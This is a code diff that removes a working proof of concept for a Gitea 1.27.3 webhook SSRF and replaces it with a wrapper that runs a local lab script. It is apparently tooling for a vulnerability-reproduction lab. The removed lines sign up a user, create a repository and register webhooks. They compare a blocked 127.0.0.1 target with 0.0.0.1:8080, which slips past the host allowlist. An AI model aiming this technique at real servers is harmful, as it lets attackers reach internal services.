@@ -222,240 +222,31 @@ def _cprint(*args, **kwargs):
 print_abraxas_banner()
 _builtins.print = _cprint
 
-from __future__ import annotations
-
-import json
-import re
-import ssl
+import stat
+import subprocess
 import sys
-import time
-import uuid
-import urllib.error
-import urllib.parse
-import urllib.request
-import http.cookiejar
+from pathlib import Path
 
-BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18131").rstrip("/")
-WITNESS = "GITEA-0000-SSRF"
-ORACLE_HIT = "http://0.0.0.1:8080/ssrf"
-ORACLE_NEG = "http://127.0.0.1:8080/ssrf"
-SUFFIX = uuid.uuid4().hex[:8]
-USER = f"labuser{SUFFIX}"
-PASSWORD = "LabPass123!"
-EMAIL = f"{USER}@lab.local"
-REPO = f"ssrf{SUFFIX}"
-CTX = ssl._create_unverified_context()
-JAR = http.cookiejar.CookieJar()
-OPENER = urllib.request.build_opener(
-    urllib.request.HTTPCookieProcessor(JAR),
-    urllib.request.HTTPSHandler(context=CTX),
-)
+HERE = Path(__file__).resolve().parent
+LAB = HERE / "lab"
+RUN = LAB / "run.sh"
 
 
-def http_req(
-    method: str,
-    url: str,
-    data: bytes | None = None,
-    headers: dict[str, str] | None = None,
-    timeout: int = 30,
-) -> tuple[int, str]:
-    hdrs = {"User-Agent": "gitea-hostmatcher-0000-ssrf-lab"}
-    if headers:
-        hdrs.update(headers)
-    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
-    try:
-        with OPENER.open(req, timeout=timeout) as resp:
-            return resp.status, resp.read().decode("utf-8", "replace")
-    except urllib.error.HTTPError as exc:
-        return exc.code, exc.read().decode("utf-8", "replace")
-
-
-def csrf_from() -> str:
-    for c in JAR:
-        if c.name in ("_csrf", "_Csrf"):
-            return c.value
-    return ""
-
-
-def form_post(path: str, fields: dict[str, str]) -> tuple[int, str]:
-    token = csrf_from()
-    if token:
-        fields = dict(fields)
-        fields["_csrf"] = token
-    body = urllib.parse.urlencode(fields).encode()
-    return http_req(
-        "POST",
-        BASE + path,
-        data=body,
-        headers={"Content-Type": "application/x-www-form-urlencoded"},
+def main() -> int:
+    if not RUN.is_file():
+        print("FAIL lab/run.sh missing")
+        return 1
+    mode = RUN.stat().st_mode
+    if not mode & stat.S_IXUSR:
+        RUN.chmod(mode | stat.S_IXUSR)
+    completed = subprocess.run(
+        ["/bin/bash", str(RUN), *sys.argv[1:]],
+        cwd=LAB,
+        check=False,
     )
-
-
-def api(method: str, path: str, data: dict | None = None) -> tuple[int, str]:
-    import base64
-
-    basic = base64.b64encode(f"{USER}:{PASSWORD}".encode()).decode()
-    hdrs = {
-        "Content-Type": "application/json",
-        "Authorization": "Basic " + basic,
-    }
-    body = None if data is None else json.dumps(data).encode()
-    return http_req(method, BASE + path, data=body, headers=hdrs)
-
-
-def register_or_login() -> None:
-    s, page = http_req("GET", BASE + "/user/sign_up")
-    print(f"IOC signup-get status={s} csrf={bool(csrf_from())}")
-    s, b = form_post(
-        "/user/sign_up",
-        {
-            "user_name": USER,
-            "email": EMAIL,
-            "password": PASSWORD,
-            "retype": PASSWORD,
-        },
-    )
-    print(f"IOC signup-post status={s} snippet={b[:160]!r}")
-    s_me, b_me = api("GET", "/api/v1/user")
-    if s_me == 200 and USER in b_me:
-        print(f"IOC registered user={USER}")
-        return
-    s, page = http_req("GET", BASE + "/user/login")
-    s, b = form_post("/user/login", {"user_name": USER, "password": PASSWORD})
-    print(f"IOC login-post status={s} snippet={b[:120]!r}")
-    s_me, b_me = api("GET", "/api/v1/user")
-    print(f"IOC user status={s_me} snippet={b_me[:120]!r}")
-    if s_me != 200:
-        print("FAIL could not register or login")
-        raise SystemExit(1)
-
-
-def create_repo() -> None:
-    s, b = api(
-        "POST",
-        "/api/v1/user/repos",
-        {
-            "name": REPO,
-            "private": True,
-            "auto_init": True,
-            "readme": "Default",
-            "default_branch": "main",
-        },
-    )
-    print(f"IOC create-repo status={s} snippet={b[:180]!r}")
-    if s not in (200, 201):
-        print("FAIL create repo")
-        raise SystemExit(1)
-    for i in range(20):
-        s, b = api("GET", f"/api/v1/repos/{USER}/{REPO}")
-        if s == 200 and '"empty":false' in b.replace(" ", "").lower() or (s == 200 and '"empty": false' in b):
-            print(f"IOC repo-ready i={i}")
-            return
-        # empty flag
-        if s == 200:
-            try:
-                empty = json.loads(b).get("empty")
-            except json.JSONDecodeError:
-                empty = True
-            if empty is False:
-                print(f"IOC repo-ready i={i}")
-                return
-        time.sleep(1)
-    print("FAIL repo never got an initial commit")
-    raise SystemExit(1)
-
-
-def create_hook(url: str, name: str) -> int:
-    s, b = api(
-        "POST",
-        f"/api/v1/repos/{USER}/{REPO}/hooks",
-        {
-            "type": "gitea",
-            "active": True,
-            "events": ["push"],
-            "name": name,
-            "config": {"url": url, "content_type": "json", "http_method": "post"},
-        },
-    )
-    print(f"IOC create-hook name={name} status={s} snippet={b[:220]!r}")
-    if s not in (200, 201):
-        print(f"FAIL create webhook {name}")
-        raise SystemExit(1)
-    hid = json.loads(b).get("id")
-    if not hid:
-        print("FAIL webhook id missing")
-        raise SystemExit(1)
-    return int(hid)
-
-
-def test_hook(hid: int) -> None:
-    s, b = api("POST", f"/api/v1/repos/{USER}/{REPO}/hooks/{hid}/tests")
-    print(f"IOC test-hook id={hid} status={s} snippet={b[:160]!r}")
-    if s not in (200, 204):
-        print("FAIL test webhook")
-        raise SystemExit(1)
-
-
-def history_html(hid: int) -> str:
-    s, b = http_req("GET", f"{BASE}/{USER}/{REPO}/settings/hooks/{hid}")
-    print(f"IOC history-page id={hid} status={s} len={len(b)}")
-    if s != 200:
-        return ""
-    return b
-
-
-def wait_history(hid: int, expect_witness: bool) -> str:
-    last = ""
-    for i in range(24):
-        last = history_html(hid)
-        has = WITNESS in last
-        deny = "deny" in last.lower() or "allowed HTTP servers" in last or "can only call allowed" in last
-        print(f"IOC poll i={i} id={hid} witness={has} denyish={deny}")
-        if expect_witness and has:
-            return last
-        if not expect_witness and (deny or ("Delivery:" in last and not has)):
-            return last
-        time.sleep(2)
-    return last
-
-
-def main() -> None:
-    print(f"IOC base={BASE} user={USER} repo={REPO} hit={ORACLE_HIT} neg={ORACLE_NEG}")
-    s, b = http_req("GET", BASE + "/api/v1/version")
-    print(f"IOC version status={s} snippet={b[:120]!r}")
-    if s != 200 or "1.27.3" not in b:
-        print("FAIL unexpected Gitea version")
-        raise SystemExit(1)
-
-    register_or_login()
-    create_repo()
-
-    neg_id = create_hook(ORACLE_NEG, "neg-loopback")
-    test_hook(neg_id)
-    neg_html = wait_history(neg_id, expect_witness=False)
-    if WITNESS in neg_html:
-        print("FAIL 127.0.0.1 webhook was not blocked")
-        raise SystemExit(1)
-    if "deny" not in neg_html.lower() and "allowed HTTP servers" not in neg_html and "can only call allowed" not in neg_html:
-        # still require a delivery record that is not success-with-witness
-        if not neg_html:
-            print("FAIL no negative-control history")
-            raise SystemExit(1)
-        print(f"IOC neg-history-snippet={neg_html[neg_html.find('webhook-info'):neg_html.find('webhook-info')+400] if 'webhook-info' in neg_html else neg_html[:400]!r}")
-        if "200" in neg_html and "GITEA-0000-SSRF" in neg_html:
-            print("FAIL 127.0.0.1 reached oracle")
-            raise SystemExit(1)
-    print("IOC negative-control 127.0.0.1 blocked")
-
-    hit_id = create_hook(ORACLE_HIT, "hit-0000")
-    test_hook(hit_id)
-    hit_html = wait_history(hit_id, expect_witness=True)
-    if WITNESS not in hit_html:
-        print("FAIL 0.0.0.1 blocked like 127.0.0.1 (no witness in history)")
-        raise SystemExit(1)
-    print("SUCCESS GITEA-HOSTMATCHER-0000")
+    return int(completed.returncode)
 
 
 if __name__ == "__main__":
-    main()
+    raise SystemExit(main())
 
